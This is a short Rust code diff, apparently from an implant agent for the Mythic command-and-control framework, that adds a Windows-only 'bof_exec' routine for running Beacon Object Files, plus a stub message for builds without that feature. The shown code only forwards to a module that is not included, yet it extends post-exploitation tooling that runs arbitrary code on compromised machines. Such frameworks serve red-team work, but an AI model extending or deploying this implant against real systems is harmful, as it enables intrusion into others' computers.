@@ -43,7 +43,18 @@ pub fn link_loop() {
             integrity_level: get_integrity_level_int(),
         },
         dispatch,
+        bof_exec,
     );
+}
+
+#[cfg(all(feature = "cmd-bof", windows))]
+fn bof_exec(coff: &[u8], entrypoint: &str, args: &str) -> String {
+    crate::bof::bof_exec(coff, entrypoint, args)
+}
+
+#[cfg(not(all(feature = "cmd-bof", windows)))]
+fn bof_exec(_coff: &[u8], _entrypoint: &str, _args: &str) -> String {
+    "[-] bof command not compiled into this payload".into()
 }
 
 /// Convert the text integrity level to the integer Mythic expects.
